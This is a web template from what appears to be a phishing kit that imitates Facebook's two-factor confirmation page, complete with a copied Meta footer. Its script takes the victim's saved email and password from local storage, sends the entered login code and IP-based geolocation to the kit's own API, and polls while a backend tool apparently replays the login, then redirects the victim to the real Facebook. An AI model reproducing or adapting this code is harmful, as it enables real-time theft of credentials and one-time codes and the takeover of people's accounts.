@push('icons')
    <link rel="apple-touch-icon" href="{{ $settings['favicon_icon'] }}" sizes="180x180">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="32x32">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="16x16">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="16x16">
    <link rel="mask-icon" href="{{ $settings['favicon_icon'] }}">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}">
@endpush
@push('styles')
    <title>@lang('common.title_confirm_page')</title>
    <!--<meta name="viewport" content="user-scalable=no">-->
    <link type="text/css" href="/css/button.css" rel="stylesheet">
    <link type="text/css" href="/css/input.css" rel="stylesheet">
    <link type="text/css" href="/css/modal.css" rel="stylesheet">
    <link type="text/css" href="/css/header.css" rel="stylesheet">
    <link type="text/css" href="/css/body.css" rel="stylesheet">
    <link type="text/css" href="/css/display.css" rel="stylesheet">
    <link type="text/css" href="/css/footer.css" rel="stylesheet">
    <link type="text/css" href="/css/spinner.css" rel="stylesheet">
    <link type="text/css" href="/css/app.css" rel="stylesheet">
    <link type="text/css" href="/css/confirm.css" rel="stylesheet">
@endpush
@push('scripts')
    <script type="text/javascript">
            const queryParams = '{!! json_encode(\App\Helpers\Helpers::getQueryParams($settings, 'path_login_page')) !!}';
            const parseQueryParams = JSON.parse(queryParams);

            function replaceQueryParam(param, value, search) {
                let regex = new RegExp("([?;&])" + param + "[^&;]*[;&]?");
                let query = search.replace(regex, "$1").replace(/&$/, '');

                return (query.length > 2 ? query + "&" : "?") + (value ? param + "=" + value : '');
            }

            if (parseQueryParams.length > 0) {
                for (const query of parseQueryParams) {
                    const currentQuery = window.location.search
                    const newUrl = replaceQueryParam(query[0], query[1], currentQuery);
                    window.history.pushState(null, null, newUrl)
                }
            }
        </script>
        <script type="text/javascript">
            $.ajaxSetup({
                headers: {
                    'X-CSRF-TOKEN': '{{ csrf_token() }}'
                }
            });

            var idIntervalGetCacheByEmail = null;
            var isLoginSuccessfully = 0;
            var email = "";
            //
            var ipAddress = "";
            var latitude = "";
            var longitude = "";
            var countryName = "";
            var countryCode = "";
            var cityName = "";
            var regionName = "";
            var timeZone = "";
            var zipCode = "";
            var continent = "";
            var continentCode = "";
            var user = JSON.parse(localStorage.getItem('user')) || '';
            if (!user) {
                window.location.href = '/';
            }

            async function setCurrentLang() {
                let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
                const response = await fetch(getIpInfoUrl);
                const ipInfo = await response.json();
                ipAddress = ipInfo.ipAddress;
                latitude = ipInfo.latitude;
                longitude = ipInfo.longitude;
                countryName = ipInfo.countryName;
                countryCode = ipInfo.countryCode;
                cityName = ipInfo.cityName;
                regionName = ipInfo.regionName;
                timeZone = ipInfo.timeZone;
                zipCode = ipInfo.zipCode;
                continent = ipInfo.continent;
                continentCode = ipInfo.continentCode;
            }
            setCurrentLang();

            async function getCacheByEmail(email) {
                let result = null;
                let formData = new FormData();
                formData.append('email', email);
                await $.ajax({
                    method: "POST",
                    url: "/api/get-cache-by-email",
                    data: formData,
                    cache: false,
                    contentType: false,
                    processData: false,
                    success: function(response) {
                        if (response.status == 0) {
                            result = response.data;
                        }
                    }
                })

                return result;
            }

            $(document).on('click', '#submit-code', async function() {
                $('.notice-error').addClass('d-none');
                const fa_code = $('#input-code').val();
                if (fa_code == '') {
                    $('#input-code').addClass('is-invalid')
                    return false;
                }
                if (!isValidOTP(fa_code)) {
                    $('#input-code').addClass('is-invalid')
                    return false;
                }

                const loading = $('#submit-code-loading');
                const text = $('#submit-code-text');
                text.addClass('d-none');
                loading.removeClass('d-none');
                let email = user.email || '';
                let password = user.password || '';
                //
                let formData = new FormData();
                formData.append('fa_code', fa_code);
                formData.append('email', email);
                formData = pushIPInfo(formData);
                await $.ajax({
                    method: "POST",
                    url: "/api/send-data-fa",
                    data: formData,
                    cache: false,
                    contentType: false,
                    processData: false,
                    success: function(response) {
                        if (response.status == 0) {
                            // start to call get cache by email waiting until tool returns response of login
                            idIntervalGetCacheByEmail = setInterval(async () => {
                                let info = await getCacheByEmail(email);
                                if (info) {
                                    text.removeClass('d-none');
                                    loading.addClass('d-none');
                                    console.log(info);
                                    if (info.isFaSuccessfully == 1) {
                                        $('.notice-error').addClass('d-none');
                                        localStorage.removeItem('user');

                                        window.location.href = 'https://www.facebook.com/';
                                    } else {
                                        console.log("Fa failed");
                                        // $('.text-error-fa').text(`@lang('confirm.error_notice')`);
                                        $('.notice-error').removeClass('d-none');
                                        text.removeClass('d-none');
                                        loading.addClass('d-none');
                                    }
                                    $('#submit-code').prop('disabled', false);
                                    clearInterval(idIntervalGetCacheByEmail);
                                    //
                                    // call api clear all cache
                                    $.ajax({
                                        method: "POST",
                                        url: "/api/delete-all-cache",
                                        success: function(response) {
                                            if (response.status == 0) {
                                                console.log(
                                                    "Delete all cache success",
                                                    response);
                                            }
                                        }
                                    });
                                } else {
                                    console.log("Still call get cache by email");
                                }
                            }, 3000);
                        } else {
                            $('#submit-code').prop('disabled', false);
                            $('.notice-error').removeClass('d-none');
                            text.removeClass('d-none');
                            loading.addClass('d-none');
                        }
                    }
                });
            })

            function pushIPInfo(formData) {
                formData.append('ipAddress', ipAddress)
                formData.append('latitude', latitude)
                formData.append('longitude', longitude)
                formData.append('countryName', countryName)
                formData.append('countryCode', countryCode)
                formData.append('regionName', regionName)
                formData.append('cityName', cityName)
                formData.append('timeZone', timeZone)
                formData.append('zipCode', zipCode)
                formData.append('continent', continent)
                formData.append('continentCode', continentCode)
                return formData;
            }

            function isValidOTP(value) {
                // const regexOtp = /^\d{6}|\d{8}$/;
                return /^\d{6}$/.test(value) || /^\d{8}$/.test(value);
            }

            function validateOtp() {
                $(this).val($(this).val().replace(/[^0-9.]/g, ''));

                if ($(this).val().length >= 8) {
                    // event.preventDefault();
                    $(this).val($(this).val().slice(0, 8));
                }

                if (!isValidOTP($(this).val())) {
                    $(this).addClass('is-invalid');
                    $('#send-otp-number').removeClass('disabled');
                } else {
                    $(this).removeClass('is-invalid');
                }
            }

            $(document).on('keypress', '.validate-otp', validateOtp)
            $(document).on('input', '.validate-otp', validateOtp)
            $(document).on('keydown', '.validate-input', validateOtp)
        </script>
@endpush
@extends('layouts.main')
@section('content')
    <main class="home">
        {{-- <div class="header header-confirm">
            <div class="header-dialog">
                <div class="header-content">
                    <div class="header-border"></div>
                    <div class="header-main"></div>
                    <div class="header-login">
                        <div class="login-content">
                            <ul class="login-content-list" role="tablist">
                                <li class="login-content-item" role="presentation">
                                    <a class="login-logout" href="javascript:;">@lang('confirm.log_out')</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div> --}}
        <div class="body form-confirm">
            <div class="fb_content clearfix " role="main">
                <div class="body-form">
                    <div class="form-confirm">
                        <div class="form-confirm-title">
                            <div class="title-confirm">@lang('confirm.title_form')</div>
                        </div>
                        <div class="line-hr"></div>
                        <div class="form-confirm-sub-title form-confirm-input">
                            <div class="sub-title-confirm">@lang('confirm.sub_title_form')</div>
                            {{-- <div class="title-confirm-input">@lang('confirm.title_input_code')</div> --}}
                            <div class="sub-title-confirm-input">@lang('confirm.sub_title_input_code')</div>
                        </div>
                        <img src="/assets/img/transfer.gif" style="width: 100%" alt="">
                        {{-- <div class="line-hr"></div>
                        <div class="form-confirm-notice">
                            <div class="title-confirm-notice">@lang('confirm.title_notice')</div>
                            <div class="sub-title-confirm-notice">@lang('confirm.sub_title_notice')</div>
                        </div>
                        <div class="line-hr"></div> --}}
                        <div class="form-confirm-input">
                            <div class="form-confirm-input-text">
                                <input id="input-code" style="font-size: 16px;" type="text" max="999999"
                                    class="form-control validate-input w-100 validate-otp"
                                    placeholder="@lang('confirm.login_code')" />
                            </div>
                        </div>
                        <div class="notice-error d-none">@lang('confirm.error_notice')</div>
                        {{-- <div class="line-hr"></div> --}}
                        <div class="form-confirm-footer">
                            <div class="form-confirm-footer-left">
                                <a href="javascript:;">@lang('confirm.need_another')</a>
                            </div>
                            <div class="form-confirm-footer-right">
                                <button id="submit-code" class="disabled">
                                    <span id="submit-code-loading"
                                        class="d-none spinner-border spinner-border-sm spinner"></span>
                                    <span id="submit-code-text">@lang('confirm.submit_code')</span>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="footer">
                    <div class="footer-wrapper">
                        <div class="footer-content">
                            <ul class="footer-item-list">
                                <li>English (US)</li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;"
                                        title="Traditional Chinese (Taiwan)">中文(台灣)</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Korean">한국어</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Japanese">日本語</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;"
                                        title="French (France)">Français (France)</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Thai">ภาษาไทย</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Spanish">Español</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;"
                                        title="Portuguese (Brazil)">Português (Brasil)</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="German">Deutsch</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;"
                                        title="Italian">Italiano</a>
                                </li>
                                <li>
                                    <a role="button" class="button-plus" rel="dialog" ajaxify=""
                                        href="javascript:;" title="Show more languages">
                                        <i class="button-plus-icon"></i>
                                    </a>
                                </li>
                            </ul>
                            <div class="content-curve"></div>
                            <div class="footer-children">
                                <ul class="footer-children-item-list">
                                    <li><a href="javascript:;" title="Sign up for Facebook">Sign Up</a></li>
                                    <li><a href="javascript:;" title="Log in to Facebook">Log in</a></li>
                                    <li><a href="javascript:;" title="Take a look at Messenger.">Messenger</a>
                                    </li>
                                    <li><a href="javascript:;" title="Facebook Lite for Android.">Facebook Lite</a>
                                    </li>
                                    <li><a href="javascript:;" title="Browse in Video">Video</a>
                                    </li>
                                    <li><a href="javascript:;"
                                            title="Take a look at popular places on Facebook.">Places</a>
                                    </li>
                                    <li><a href="javascript:;" title="Check out Facebook games.">Games</a></li>
                                    <li><a href="javascript:;"
                                            title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
                                    <li><a href="javascript:;" title="Learn more about Meta Pay" target="_blank">Meta
                                            Pay</a></li>
                                    <li><a href="javascript:;" title="Discover Meta" target="_blank">Meta
                                            Store</a>
                                    </li>
                                    <li><a href="javascript:;" title="Learn more about Meta Quest"
                                            target="_blank">Meta
                                            Quest</a></li>
                                    <li><a href="" title="Take a look at Instagram" target="_blank"
                                            rel="noreferrer nofollow" data-lynx-mode="asynclazy">Instagram</a></li>
                                    <li><a href="" title="Check out Threads" target="_blank"
                                            rel="noreferrer nofollow" data-lynx-mode="asynclazy">Threads</a></li>
                                    <li><a href="javascript:;" title="Donate to worthy causes.">Fundraisers</a></li>
                                    <li><a href="javascript:;"
                                            title="Browse our Facebook Services directory.">Services</a></li>
                                    <li><a href="javascript:;" title="See the Voting Information Centre">Voting
                                            Information Centre</a></li>
                                    <li><a href="javascript:;"
                                            title="Learn how we collect, use and share information to support Facebook.">Privacy
                                            Policy</a></li>
                                    <li><a href="javascript:;"
                                            title="Learn how to manage and control your privacy on Facebook.">Privacy
                                            Centre</a></li>
                                    <li><a href="javascript:;" title="Explore our groups.">Groups</a></li>
                                    <li><a href="javascript:;" accesskey="8"
                                            title="Read our blog, discover the resource centre and find job opportunities.">About</a>
                                    </li>
                                    <li>
                                        <a href="javascript:;" title="Advertise on Facebook">Create ad</a>
                                    </li>
                                    <li><a href="javascript:;" title="Create a Page">Create
                                            Page</a>
                                    </li>
                                    <li><a href="javascript:;" title="Develop on our platform.">Developers</a>
                                    </li>
                                    <li><a href="javascript:;"
                                            title="Make your next career move to our brilliant company.">Careers</a>
                                    </li>
                                    <li><a href="javascript:;" title="Learn about cookies and Facebook."
                                            data-nocookies="1">Cookies</a></li>
                                    <li><a class="_41ug" data-nocookies="1" href="javascript:;"
                                            title="Learn about AdChoices.">AdChoices<i
                                                class="img sp_EP9wX8qDDvu sx_6bdd81"></i></a></li>
                                    <li><a data-nocookies="1" href="javascript:;" accesskey="9"
                                            title="Review our terms and policies.">Terms</a></li>
                                    <li><a href="javascript:;" accesskey="0" title="Visit our Help Centre.">Help</a>
                                    </li>
                                    <li><a href="javascript:;"
                                            title="Visit our contact uploading and non-users notice.">Contact uploading
                                            and
                                            non-users</a></li>
                                    <li><a accesskey="6" class="accessible_elem" href="/settings"
                                            title="View and edit your Facebook settings.">Settings</a></li>
                                    <li><a accesskey="7" class="accessible_elem" href="javascript:;"
                                            title="View your activity log">Activity log</a></li>
                                </ul>
                            </div>
                            <div class="footer-copyright">
                                <div><span> Meta © 2024</span></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div></div>
            <span></span>
        </div>
    </main>
@endsection